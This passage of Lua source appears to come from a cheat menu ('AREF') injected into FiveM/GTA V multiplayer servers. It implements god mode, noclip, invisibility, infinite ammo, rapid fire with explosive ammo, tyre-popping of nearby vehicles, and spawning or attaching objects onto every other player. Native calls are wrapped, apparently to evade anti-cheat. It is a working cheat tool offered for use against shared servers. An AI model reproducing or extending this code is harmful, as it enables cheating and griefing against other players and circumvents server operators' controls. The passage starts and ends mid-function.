                if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["DOWN"]) and not self.Showing then
   
                    local new = selected_give_opt + 1
   
    
   
                    if options[new] then
   
                        selected_give_opt = new
   
                    else
   
                        selected_give_opt = 1
   
                    end
   
                end
   
    
   
                if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["UP"]) and not self.Showing then
   
                    local new = selected_give_opt - 1
   
    
   
                    if options[new] then
   
                        selected_give_opt = new
   
                    else
   
                        selected_give_opt = #options
   
                    end
   
                end
   
    
   
                if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["BACKSPACE"]) and not self.Showing then
   
                    self.Showing = was_showing_give
   
                    self.SpawnObjectOn = nil
   
                    selected_give_opt = 1
   
                    _no_combat = false
   
                end
   
    
   
                if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["ENTER"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["MOUSE1"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["SPACE"]) and not self.Showing then
   
                    local object = options[cur_opt]
   
    
   
                    if self:RequestModelSync(object) then
   
                        local should_attach = self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"])
   
                        self:AddNotification("INFO", should_attach and ("Attached " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, object)) or ("Spawned " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, object)))
   
                        local on_all = self.SpawnObjectOn == "all"
   
    
   
                        if on_all then
   
                            for id, src in dict.pairs(self.PlayerCache) do
   
                                src = dict.tonumber(src)
   
    
   
                                if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then
   
                                    local where = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(src), 0.0, 0.0, 0.0)
   
                                    local obj = self:GetFunction("CreateObject")(self:GetFunction("GetHashKey")(object), where.x, where.y, where.z, true, true, true)
   
                                    self:DoNetwork(obj)
   
    
   
                                    if should_attach then
   
                                        self:GetFunction("AttachEntityToEntity")(obj, self:GetFunction("GetPlayerPed")(src), 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, true, 1, false)
   
                                    end
   
    
   
                                    Wait(50)
   
                                end
   
                            end
   
                        else
   
                            local where = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.SpawnObjectOn, 0.0, 0.0, 0.0)
   
                            local obj = self:GetFunction("CreateObject")(self:GetFunction("GetHashKey")(object), where.x, where.y, where.z, true, true, true)
   
                            self:DoNetwork(obj)
   
    
   
                            if should_attach then
   
                                self:GetFunction("AttachEntityToEntity")(obj, self.SpawnObjectOn, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, true, 1, false)
   
                            end
   
    
   
                            Wait(50)
   
                        end
   
                    end
   
                end
   
    
   
                self.Painter:DrawRect(self:ScrW() - 360 - 21 - offX, 20, 360, sY + 8, 0, 0, 0, 200)
   
                self.Painter:DrawRect(self:ScrW() - 360 - 21 - offX, 49, 360, 2, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], 255)
   
            end
   
        end
   
    
   
        function AREF:DoCrosshair()
   
            if not self.Config.Player.CrossHair then return end
   
            if self.FreeCam.On then return end
   
            self.Painter:DrawText("+", 7, true, self:ScrW() / 2, self:ScrH() / 2 - 14, 0.4, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], 255)
   
        end
   
    
   
        function AREF:IsWaypointValid()
   
            local waypoint = self:GetFunction("GetFirstBlipInfoId")(8)
   
    
   
            return DoesBlipExist(waypoint)
   
        end
   
    
   
        function AREF:GetWaypointCoords()
   
            local waypoint = self:GetFunction("GetFirstBlipInfoId")(8)
   
            if not DoesBlipExist(waypoint) then return end
   
            local coords = self:GetFunction("GetBlipInfoIdCoord")(waypoint)
   
    
   
            return coords
   
        end
   
    
   
        local should_pop = {}
   
    
   
        local wheel_index = {
   
            {
   
                bone = "wheel_lf",
   
                index = 0
   
            },
   
            {
   
                bone = "wheel_rf",
   
                index = 1
   
            },
   
            {
   
                bone = "wheel_lm",
   
                index = 2
   
            },
   
            {
   
                bone = "wheel_rm",
   
                index = 3
   
            },
   
            {
   
                bone = "wheel_lr",
   
                index = 4
   
            },
   
            {
   
                bone = "wheel_rr",
   
                index = 5
   
            }
   
        }
   
    
   
        function AREF:PopTires()
   
            for id, spike in dict.pairs(dict.spike_ents) do
   
                if not self:GetFunction("DoesEntityExist")(spike) then
   
                    dict.table.remove(dict.spike_ents, id)
   
                else
   
                    for veh in self:EnumerateVehicles() do
   
                        local overall_dist = self:GetFunction("GetDistanceBetweenCoords")(self:GetFunction("GetOffsetFromEntityInWorldCoords")(veh, 0.0, 0.0, 0.0), self:GetFunction("GetOffsetFromEntityInWorldCoords")(spike, 0.0, 0.0, 0.0), true)
   
    
   
                        if overall_dist <= 20.0 then
   
                            for indx = 1, #wheel_index do
   
                                local t_pos = self:GetFunction("GetWorldPositionOfEntityBone")(veh, self:GetFunction("GetEntityBoneIndexByName")(veh, wheel_index[indx].bone))
   
                                local s_pos = self:GetFunction("GetOffsetFromEntityInWorldCoords")(spike, 0.0, 0.0, 0.0)
   
                                local dist = self:GetFunction("GetDistanceBetweenCoords")(t_pos.x, t_pos.y, t_pos.z, s_pos.x, s_pos.y, s_pos.z, true)
   
    
   
                                if dist <= 2.0 and (not self:GetFunction("IsVehicleTyreBurst")(veh, wheel_index[indx].index, true) and not self:GetFunction("IsVehicleTyreBurst")(veh, wheel_index[indx].index, false)) then
   
                                    should_pop[veh] = should_pop[veh] or {}
   
                                    should_pop[veh][indx] = true
   
                                end
   
                            end
   
                        end
   
                    end
   
                end
   
            end
   
    
   
            for veh, dat in dict.pairs(should_pop) do
   
                for indx, _ in dict.pairs(dat) do
   
                    if not self:GetFunction("DoesEntityExist")(veh) then
   
                        should_pop[veh] = nil
   
                        break
   
                    end
   
    
   
                    if self:RequestControlSync(veh) then
   
                        self:GetFunction("SetVehicleTyreBurst")(veh, wheel_index[indx].index, false, 1000.0)
   
                        dat[indx] = nil
   
                    end
   
                end
   
            end
   
        end
   
    
   
        function AREF:DoNoclip()
   
            self:GetFunction("SetPedCanRagdoll")(self.LocalPlayer, false)
   
            self:GetFunction("ResetPedRagdollTimer")(self.LocalPlayer, false)
   
            self:GetFunction("SetPedConfigFlag")(self.LocalPlayer, 60, true)
   
            self:GetFunction("SetPedConfigFlag")(self.LocalPlayer, 61, true)
   
            self:GetFunction("SetPedConfigFlag")(self.LocalPlayer, 104, true)
   
            self:GetFunction("SetPedConfigFlag")(self.LocalPlayer, 276, true)
   
            self:GetFunction("SetPedConfigFlag")(self.LocalPlayer, 76, false)
   
            local velocity = dict.vector_origin
   
            local forward = self:GetFunction("GetEntityForwardVector")(self.LocalPlayer)
   
            local up = vector3(0, 0, 1)
   
            local speed = 100.0
   
    
   
            if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTCTRL"]) then
   
                speed = 50.0
   
            elseif AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) then
   
                speed = 200.0
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["W"]) then
   
                velocity = velocity + forward * speed
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["S"]) then
   
                velocity = velocity - forward * speed
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["SPACE"]) then
   
                velocity = velocity + up * speed
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["X"]) then
   
                velocity = velocity - up * speed
   
            end
   
    
   
            self:GetFunction("SetEntityVelocity")(self.LocalPlayer, velocity.x, velocity.y, velocity.z)
   
        end
   
    
   
        local _was_anti_afk
   
        local sort_func = function(srcA, srcB) return srcA - srcB end
   
        local force_reload = {}
   
    
   
        CreateThread(function()
   
            while AREF.Enabled do
   
                Wait(200)
   
    
   
                if not AREF.Showing and dict.bind_time < AREF:GetFunction("GetGameTimer")() then
   
                    AREF:DoBindListener()
   
                end
   
            end
   
        end)
   
    
   
        CreateThread(function()
   
            while AREF.Enabled do
   
                Wait(0)
   
                AREF.LocalPlayer = AREF:GetFunction("PlayerPedId")()
   
                AREF.NetworkID = AREF:GetFunction("PlayerId")()
   
                AREF.PlayerCache = AREF:GetFunction("GetActivePlayers")()
   
                local w, h = AREF:GetFunction("GetActiveScreenResolution")()
   
                AREF._ScrW = w
   
                AREF._ScrH = h
   
    
   
                if w and h and not AREF.Config.NotifX and not AREF.Config.NotifY then
   
                    AREF.Config.NotifX = w - AREF.Config.NotifW - 20
   
                    AREF.Config.NotifY = 20
   
                end
   
    
   
                if not AREF.Config.NotifW then
   
                    AREF.Config.NotifW = 420
   
                end
   
    
   
                if not AREF:GetFunction("IsPauseMenuActive")() then
   
                    AREF:Cleanup()
   
                    AREF:PopTires()
   
                    AREF:DoESP()
   
                    AREF:DoGiveWeaponUI()
   
                    AREF:DoTakeWeaponUI()
   
                    AREF:DoSpawnObjectUI()
   
                    AREF:DoLSC()
   
                    AREF:DoAntiAim()
   
                    AREF:DoVehicleRelated()
   
                    AREF:DoBlips()
   
                    AREF:Tracker()
   
                    AREF:DoFrozen()
   
                    AREF:DoCrosshair()
   
                    local keyboard_open = AREF:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and AREF:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and AREF:GetFunction("UpdateOnscreenKeyboard")() ~= 2
   
    
   
                    if not AREF:GetFunction("HasStreamedTextureDictLoaded")("commonmenu") then
   
                        AREF:GetFunction("RequestStreamedTextureDict")("commonmenu")
   
                    end
   
    
   
                    AREF:DrawNotifications()
   
    
   
                    if walking and not magic_riding then
   
                        local safe
   
    
   
                        if not AREF.Showing and AREF.Config.UseAutoWalk and not (AREF.Config.UseAutoWalkAlt and (AREF.FreeCam.On or AREF.RCCar.CamOn)) then
   
                            safe = true
   
                        elseif not AREF.Config.UseAutoWalk and not (AREF.Config.UseAutoWalkAlt and (AREF.FreeCam.On or AREF.RCCar.CamOn)) then
   
                            safe = true
   
                        elseif not AREF.Config.UseAutoWalkAlt and (AREF.FreeCam.On or AREF.RCCar.CamOn) then
   
                            safe = true
   
                        end
   
    
   
                        if not AREF.Config.Player.AntiAFK and _was_anti_afk then
   
                            safe = true
   
                        end
   
    
   
                        if AREF.Config.Player.MoveToWaypoint and dict.moving_wp then
   
                            safe = false
   
                        end
   
    
   
                        if AREF.Config.Player.AntiAFK then
   
                            safe = false
   
                        end
   
    
   
                        if safe then
   
                            AREF:GetFunction("ClearPedTasks")(AREF.LocalPlayer)
   
                            walking = false
   
                        end
   
                    end
   
    
   
                    if not walking and not magic_riding then
   
                        local safe
   
    
   
                        if AREF.Showing and AREF.Config.UseAutoWalk and not (AREF.RCCar.CamOn or AREF.FreeCam.On) then
   
                            safe = true
   
                        elseif AREF.Config.UseAutoWalkAlt and (AREF.RCCar.CamOn or AREF.FreeCam.On) then
   
                            safe = true
   
                        end
   
    
   
                        if was_fakedead or fakedead_timer >= AREF:GetFunction("GetGameTimer")() then
   
                            safe = false
   
                            AREF:GetFunction("ClearPedTasks")(AREF.LocalPlayer)
   
                        end
   
    
   
                        if AREF.Config.Player.MoveToWaypoint and dict.moving_wp then
   
                            safe = false
   
                        end
   
    
   
                        if AREF.Config.Player.AntiAFK then
   
                            safe = true
   
                        end
   
    
   
                        if safe then
   
                            walking = true
   
                            local veh = AREF:GetFunction("GetVehiclePedIsIn")(AREF.LocalPlayer)
   
    
   
                            if AREF:GetFunction("DoesEntityExist")(veh) then
   
                                AREF:GetFunction("TaskVehicleDriveWander")(AREF.LocalPlayer, veh, 40.0, 262847)
   
                            else
   
                                AREF:GetFunction("TaskWanderStandard")(AREF.LocalPlayer, 10.0, 10)
   
                            end
   
                        end
   
                    end
   
    
   
                    if not AREF.FreeCam.On and not AREF.SpectatingPlayer and not AREF.RCCar.CamOn and not AREF.Config.DisableMovement then
   
                        AREF:GetFunction("EnableAllControlActions")(0)
   
                    elseif not AREF.Config.DisableMovement then
   
                        AREF:EnableMouse()
   
                    end
   
    
   
                    if AREF.Showing then
   
                        local x, y = AREF:GetFunction("GetNuiCursorPosition")()
   
                        AREF._MouseX = x
   
                        AREF._MouseY = y
   
    
   
                        if AREF.Config.DisableMovement and (not AREF.FreeCam.On and not AREF.SpectatingPlayer and not AREF.RCCar.CamOn) then
   
                            AREF:GetFunction("DisableAllControlActions")(0)
   
                        elseif not AREF.Config.DisableMovement then
   
                            AREF.FreeCam:DisableCombat(true)
   
                        end
   
    
   
                        AREF:GetFunction("SetMouseCursorActiveThisFrame")()
   
                        AREF:GetFunction("SetMouseCursorSprite")(1)
   
                        AREF:DrawMenu()
   
    
   
                        if not was_showing then
   
                            selected_config = "none"
   
                        end
   
    
   
                        was_showing = true
   
                    elseif was_showing then
   
                        if walking and not AREF:GetFunction("IsEntityInAir")(AREF.LocalPlayer) then
   
                            AREF:GetFunction("ClearPedTasks")(AREF.LocalPlayer)
   
                            walking = false
   
                        end
   
    
   
                        was_showing = false
   
                    end
   
    
   
                    if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys[AREF.Config.ShowKey]) and not keyboard_open then
   
                        AREF.Showing = not AREF.Showing
   
                    end
   
    
   
                    if AREF.Config.FreeCamKey ~= "NONE" and AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys[AREF.Config.FreeCamKey]) and not keyboard_open and (not AREF.GivingWeaponTo or not AREF:GetFunction("DoesEntityExist")(AREF.GivingWeaponTo)) and (not AREF.TakingWeaponFrom or not AREF:GetFunction("DoesEntityExist")(AREF.TakingWeaponFrom)) then
   
                        AREF.RCCar.CamOn = false
   
                        AREF.SpectatingPlayer = nil
   
                        Wait(1)
   
                        AREF.FreeCam.On = not AREF.FreeCam.On
   
                    end
   
    
   
                    if AREF.Config.RCCamKey ~= "NONE" and AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys[AREF.Config.RCCamKey]) and not keyboard_open and (not AREF.GivingWeaponTo or not AREF:GetFunction("DoesEntityExist")(AREF.GivingWeaponTo)) and (not AREF.TakingWeaponFrom or not AREF:GetFunction("DoesEntityExist")(AREF.TakingWeaponFrom)) then
   
                        AREF.FreeCam.On = false
   
                        AREF.SpectatingPlayer = nil
   
                        Wait(1)
   
    
   
                        if AREF.RCCar.On then
   
                            AREF.RCCar.CamOn = not AREF.RCCar.CamOn
   
                        else
   
                            AREF:AddNotification("ERROR", "No RC Car is active!")
   
                        end
   
                    end
   
    
   
                    if AREF.Config.DisableKey ~= "NONE" and AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys[AREF.Config.DisableKey]) and not keyboard_open and (not AREF.GivingWeaponTo or not AREF:GetFunction("DoesEntityExist")(AREF.GivingWeaponTo)) and (not AREF.TakingWeaponFrom or not AREF:GetFunction("DoesEntityExist")(AREF.TakingWeaponFrom)) then
   
                        AREF:GetFunction("ClearPedTasks")(AREF.LocalPlayer)
   
                        AREF.Enabled = false
   
                        AREF:Print("[MENU] Menu killed.")
   
                    end
   
    
   
                    if AREF.Config.Player.ForceRadar then
   
                        AREF:GetFunction("DisplayRadar")(true)
   
                    end
   
    
   
                    if AREF.Config.Player.FakeDead then
   
                        AREF:GetFunction("SetPedToRagdoll")(AREF.LocalPlayer, 1000, 1000, 0, true, true, false)
   
                        was_fakedead = true
   
                    elseif was_fakedead then
   
                        walking = false
   
                        AREF:GetFunction("SetPedToRagdoll")(AREF.LocalPlayer, 1, 1, 0, true, true, false)
   
                        AREF:GetFunction("ClearPedTasks")(AREF.LocalPlayer)
   
                        was_fakedead = false
   
                        fakedead_timer = AREF:GetFunction("GetGameTimer")() + 1500
   
                    end
   
    
   
                    if AREF.Config.Player.SuperJump then
   
                        AREF:GetFunction("SetSuperJumpThisFrame")(AREF.NetworkID)
   
                    end
   
    
   
                    if AREF.Config.Player.MoveToWaypoint then
   
                        if dict.moving_wp and (not AREF:IsWaypointValid() or (not AREF:GetFunction("IsPedInAnyVehicle")(AREF.LocalPlayer) or AREF:GetFunction("GetPedInVehicleSeat")(AREF:GetFunction("GetVehiclePedIsIn")(AREF.LocalPlayer), -1) ~= AREF.LocalPlayer)) then
   
                            AREF.Config.Player.MoveToWaypoint = false
   
                            dict.moving_wp = false
   
                            AREF:GetFunction("ClearPedTasks")(AREF.LocalPlayer)
   
                        else
   
                            if not dict.moving_wp then
   
                                local veh = AREF:GetFunction("GetVehiclePedIsIn")(AREF.LocalPlayer)
   
                                local where = AREF:GetWaypointCoords()
   
    
   
                                if AREF:GetFunction("DoesEntityExist")(veh) then
   
                                    AREF:GetFunction("TaskVehicleDriveToCoordLongrange")(AREF.LocalPlayer, veh, where.x, where.y, 0.0, 40.0, 60, 1.0)
   
                                end
   
    
   
                                dict.moving_wp = true
   
                            end
   
                        end
   
                    end
   
    
   
                    if AREF.Config.Player.Invisibility then
   
                        AREF:GetFunction("SetEntityVisible")(AREF.LocalPlayer, false, false)
   
                        AREF:GetFunction("SetEntityLocallyVisible")(AREF.LocalPlayer, true)
   
                        AREF:GetFunction("SetEntityAlpha")(AREF.LocalPlayer, 150)
   
                        was_invis = true
   
                    elseif was_invis then
   
                        AREF:GetFunction("SetEntityVisible")(AREF.LocalPlayer, true, true)
   
                        AREF:GetFunction("SetEntityAlpha")(AREF.LocalPlayer, 255)
   
                        was_invis = false
   
                    end
   
    
   
                    AREF:GetFunction("SetEntityProofs")(AREF.LocalPlayer, AREF.Config.Player.God, AREF.Config.Player.God, AREF.Config.Player.God, AREF.Config.Player.God, AREF.Config.Player.God, AREF.Config.Player.God, AREF.Config.Player.God, AREF.Config.Player.God)
   
    
   
                    if AREF.Config.Player.SemiGod then
   
                        AREF:GetFunction("SetEntityHealth")(AREF.LocalPlayer, 200)
   
                    end
   
    
   
                    if AREF.Config.Player.InfiniteStamina then
   
                        AREF:GetFunction("ResetPlayerStamina")(AREF.NetworkID)
   
                    end
   
    
   
                    if AREF.Config.Player.ThermalVision then
   
                        AREF:GetFunction("SetSeethrough")(true)
   
                        was_thermal = true
   
                    elseif was_thermal then
   
                        AREF:GetFunction("SetSeethrough")(false)
   
                        was_thermal = false
   
                    end
   
    
   
                    if AREF.Config.Player.NoClip then
   
                        AREF:DoNoclip()
   
                        was_noclip = true
   
                    elseif was_noclip then
   
                        AREF:GetFunction("SetPedCanRagdoll")(AREF.LocalPlayer, true)
   
                        was_noclip = false
   
                    end
   
    
   
                    if AREF.Config.Player.NoRagdoll then
   
                        AREF:GetFunction("SetPedCanRagdoll")(AREF.LocalPlayer, false)
   
                        was_noragdoll = true
   
                    elseif was_noragdoll then
   
                        AREF:GetFunction("SetPedCanRagdoll")(AREF.LocalPlayer, true)
   
                        was_noragdoll = false
   
                    end
   
    
   
                    if AREF.Config.Player.FastRun then
   
                        AREF:GetFunction("SetRunSprintMultiplierForPlayer")(AREF.NetworkID, 1.49)
   
                        AREF:GetFunction("SetPedMoveRateOverride")(AREF.LocalPlayer, 2.0)
   
                        was_fastrun = true
   
                    elseif was_fastrun then
   
                        AREF:GetFunction("SetRunSprintMultiplierForPlayer")(AREF.NetworkID, 1.0)
   
                        AREF:GetFunction("SetPedMoveRateOverride")(AREF.LocalPlayer, 0.0)
   
                        was_fastrun = false
   
                    end
   
    
   
                    if AREF.Config.Player.NoReload then
   
                        local curWep = AREF:GetFunction("GetSelectedPedWeapon")(AREF.LocalPlayer)
   
    
   
                        if not force_reload[curWep] then
   
                            AREF:GetFunction("PedSkipNextReloading")(AREF.LocalPlayer)
   
                        end
   
                    end
   
    
   
                    if AREF.Config.Player.InfiniteAmmo then
   
                        local curWep = AREF:GetFunction("GetSelectedPedWeapon")(AREF.LocalPlayer)
   
                        local ret, cur_ammo = AREF:GetFunction("GetAmmoInClip")(AREF.LocalPlayer, curWep)
   
    
   
                        if ret then
   
                            local max_ammo = AREF:GetFunction("GetMaxAmmoInClip")(AREF.LocalPlayer, curWep, 1)
   
    
   
                            if cur_ammo < max_ammo and max_ammo > 0 then
   
                                AREF:GetFunction("SetAmmoInClip")(AREF.LocalPlayer, curWep, max_ammo)
   
                            end
   
                        end
   
    
   
                        local ret, max = AREF:GetFunction("GetMaxAmmo")(AREF.LocalPlayer, curWep)
   
    
   
                        if ret then
   
                            AREF:GetFunction("SetPedAmmo")(AREF.LocalPlayer, curWep, max)
   
                        end
   
                    end
   
    
   
                    if AREF.Config.Player.InfiniteAmmo then
   
                        local curWep = AREF:GetFunction("GetSelectedPedWeapon")(AREF.LocalPlayer)
   
                        local ret, cur_ammo = AREF:GetFunction("GetAmmoInClip")(AREF.LocalPlayer, curWep)
   
    
   
                        if ret then
   
                            local max_ammo = AREF:GetFunction("GetMaxAmmoInClip")(AREF.LocalPlayer, curWep, 1)
   
    
   
                            if cur_ammo < max_ammo and max_ammo > 0 then
   
                                AREF:GetFunction("SetAmmoInClip")(AREF.LocalPlayer, curWep, max_ammo)
   
                            end
   
                        end
   
                    end
   
    
   
                    if AREF.Config.Player.RapidFire and IsDisabledControlPressed(0, AREF.Keys["MOUSE1"]) and not AREF.Showing and (not AREF.FreeCam.On and not AREF.RCCar.CamOn) then
   
                        local curWep = AREF:GetFunction("GetSelectedPedWeapon")(AREF.LocalPlayer)
   
                        local cur = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(AREF:GetFunction("GetCurrentPedWeaponEntityIndex")(AREF.LocalPlayer), 0.0, 0.0, 0.0)
   
                        local _dir = AREF:GetFunction("GetGameplayCamRot")(0)
   
                        local dir = rot_to_dir(_dir)
   
                        local dist = AREF.Config.Player.NoDrop and 99999.0 or 200.0
   
                        local len = _multiply(dir, dist)
   
                        local targ = cur + len
   
                        AREF:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, curWep, AREF.LocalPlayer, true, true, 24000.0)
   
    
   
                        if AREF.Config.Player.ExplosiveAmmo then
   
                            local impact, coords = AREF:GetFunction("GetPedLastWeaponImpactCoord")(AREF.LocalPlayer)
   
    
   
                            if impact then
   
                                AREF:GetFunction("AddExplosion")(coords.x, coords.y, coords.z, 7, 100000.0, true, false, 0.0)
   
                            end
   
                        end
   
                    end
   
    
   
                    if not AREF.Config.Player.RapidFire and AREF.Config.Player.ExplosiveAmmo then
   
                        local impact, coords = AREF:GetFunction("GetPedLastWeaponImpactCoord")(AREF.LocalPlayer)
   
    
   
                        if impact then
   
                            AREF:GetFunction("AddExplosion")(coords.x, coords.y, coords.z, 7, 100000.0, true, false, 0.0)
   
                        end
   
    
   
                        AREF:GetFunction("SetExplosiveMeleeThisFrame")(AREF.NetworkID)
   
                    end
   
    
   
                    if AREF.Config.Player.InfiniteCombatRoll then
   
                        for i = 0, 3 do
   
                            AREF:GetFunction("StatSetInt")(AREF:GetFunction("GetHashKey")("mp" .. i .. "_shooting_ability"), 9999, true)
   
                            AREF:GetFunction("StatSetInt")(AREF:GetFunction("GetHashKey")("sp" .. i .. "_shooting_ability"), 9999, true)
   
                        end
   
    
   
                        was_infinite_combat_roll = true
   
                    elseif was_infinite_combat_roll then
   
                        for i = 0, 3 do
   
                            AREF:GetFunction("StatSetInt")(AREF:GetFunction("GetHashKey")("mp" .. i .. "_shooting_ability"), 0, true)
   
                            AREF:GetFunction("StatSetInt")(AREF:GetFunction("GetHashKey")("sp" .. i .. "_shooting_ability"), 0, true)
   
                        end
   
                    end
   
    
   
                    if AREF.Config.Player.MagMode then
   
                        AREF:DoMagneto()
   
                    end
   
    
   
                    AREF:DoKeyPressed()
   
                end
   
            end
   
        end)
   
    
   
        local _keys = {}
   
    
   
        function AREF:DoKeyPressed()
   
            if not self.Config.ShowControlsOnScreen then return end
   
            local offY = 0
   
            local count = 0
   
    
   
            for name, control in dict.pairs(self.Keys) do
   
                if self:GetFunction("IsControlJustPressed")(0, control) or self:GetFunction("IsDisabledControlJustPressed")(0, control) then
   
                    _keys[#_keys + 1] = {
   
                        str = name .. "[" .. control .. "]",
   
                        expires = self:GetFunction("GetGameTimer")() + 5000
   
                    }
   
                end
   
    
   
                count = count + 1
   
            end
   
    
   
            for _, key in dict.pairs(_keys) do
   
                local cur = self:GetFunction("GetGameTimer")()
   
                local left = key.expires - cur
   
    
   
                if left <= 0 then
   
                    dict.table.remove(_keys, _)
   
                else
   
                    local secs = (left / 1000)
   
                    local alpha = dict.math.ceil(((left / 1000) / 5) * 255) + 50
   
                    alpha = _clamp(alpha, 0, 255)
   
                    offY = offY + 0.024 * _clamp(secs * 4, 0, 1)
   
                    self:ScreenText(key.str, 4, 0.0, 0.8, 1 - offY, 0.3, 255, 255, 255, alpha)
   
                end
   
            end
   
        end
   
    
   
        local function _do_riding()
   
            if not magic_riding then
   
                AREF:GetFunction("ClearPedTasks")(AREF.LocalPlayer)
   
                local rot = AREF:GetFunction("GetEntityRotation")(magic_carpet_obj)
   
                AREF:GetFunction("SetEntityRotation")(magic_carpet_obj, 0.0, rot.y, rot.z)
   
            else
   
                local coords = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(AREF.LocalPlayer, 0.0, 0.0, 0.0)
   
                local carpet = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, 0.0, 0.0, 0.0)
   
                local head = AREF:GetFunction("GetEntityHeading")(magic_carpet_obj)
   
                AREF:GetFunction("SetEntityHeading")(AREF.LocalPlayer, head)
   
                AREF:GetFunction("SetEntityCoords")(AREF.LocalPlayer, carpet.x, carpet.y, carpet.z, false, false, false, false)
   
                AREF:GetFunction("TaskPlayAnim")(AREF.LocalPlayer, "rcmcollect_paperleadinout@", "meditiate_idle", 2.0, 2.5, -1, 47, 0, 0, 0, 0)
   
            end
   
        end
   
    
   
        local function _up_vec()
   
            local up = vector3(0, 0, 1)
   
    
   
            return up
   
        end
   
    
   
        local function _do_flying()
   
            if not magic_riding then return end
   
            AREF.FreeCam:DisableMovement(true)
   
    
   
            if not IsEntityPlayingAnim(AREF.LocalPlayer, "rcmcollect_paperleadinout@", "meditiate_idle", 3) then
   
                AREF:GetFunction("TaskPlayAnim")(AREF.LocalPlayer, "rcmcollect_paperleadinout@", "meditiate_idle", 2.0, 2.5, -1, 47, 0, 0, 0, 0)
   
            end
   
    
   
            local carpet = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, 0.0, 0.0, 0.0)
   
            local rot = AREF:GetFunction("GetGameplayCamRot")(0)
   
    
   
            if not AREF.FreeCam.On then
   
                AREF:GetFunction("SetEntityRotation")(magic_carpet_obj, rot.x + 0.0, rot.y + 0.0, rot.z + 0.0)
   
                local forwardVec = AREF:GetFunction("GetEntityForwardVector")(magic_carpet_obj)
   
                local upVec = _up_vec(magic_carpet_obj)
   
                local speed = 1.0
   
    
   
                if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTCTRL"]) then
   
                    speed = 0.1
   
                elseif AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) then
   
                    speed = 1.8
   
                end
   
    
   
                if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["W"]) then
   
                    carpet = carpet + forwardVec * speed
   
                end
   
    
   
                if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["S"]) then
   
                    carpet = carpet - forwardVec * speed
   
                end
   
    
   
                if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["SPACE"]) then
   
                    carpet = carpet + upVec * speed
   
                end
   
    
   
                if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["X"]) then
   
                    carpet = carpet - upVec * speed
   
                end
   
    
   
                AREF:GetFunction("SetEntityCoords")(magic_carpet_obj, carpet.x, carpet.y, carpet.z, false, false, false, false)
   
            end
   
    
   
            AREF:GetFunction("SetEntityRotation")(AREF.LocalPlayer, rot.x, rot.y, rot.z)
   
            AREF:GetFunction("AttachEntityToEntity")(AREF.LocalPlayer, magic_carpet_obj, 0, 0.0, 0.0, 1.0, rot.x, AREF:GetFunction("GetEntityHeading")(magic_carpet_obj), rot.z, false, false, false, false, 1, false)
   
        end
   
    
   
        CreateThread(function()
   
            while AREF.Enabled do
   
                Wait(0)
   
    
   
                if _no_combat and not _was_no_combat then
   
                    _was_no_combat = true
   
                elseif not _no_combat and _was_no_combat then
   
                    _was_no_combat = false
   
                    AREF.FreeCam:DisableCombat(_no_combat)
   
                end
   
    
   
                if _no_combat then
   
                    AREF.FreeCam:DisableCombat(_no_combat)
   
                end
   
            end
   
        end)
   
    
   
        CreateThread(function()
   
            AREF:RequestModelSync("apa_mp_h_acc_rugwoolm_03")
   
            AREF:GetFunction("RequestAnimDict")("rcmcollect_paperleadinout@")
   
    
   
            while AREF.Enabled do
   
                Wait(0)
   
    
   
                if AREF.Config.Player.MagicCarpet then
   
                    local our_cam = AREF:GetFunction("GetRenderingCam")()
   
    
   
                    if not magic_carpet_obj or not AREF:GetFunction("DoesEntityExist")(magic_carpet_obj) then
   
                        local cur = AREF:GetFunction("GetGameplayCamCoord")()
   
                        local _dir = AREF:GetFunction("GetGameplayCamRot")(0)
   
                        local dir = rot_to_dir(_dir)
   
                        local dist = 100.0
   
                        local len = _multiply(dir, dist)
   
                        local targ = cur + len
   
                        local handle = AREF:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 1, preview_magic_carpet)
   
                        local _, hit, hit_pos, _, entity = AREF:GetFunction("GetShapeTestResult")(handle)
   
    
   
                        if not preview_magic_carpet or not AREF:GetFunction("DoesEntityExist")(preview_magic_carpet) then
   
                            _no_combat = true
   
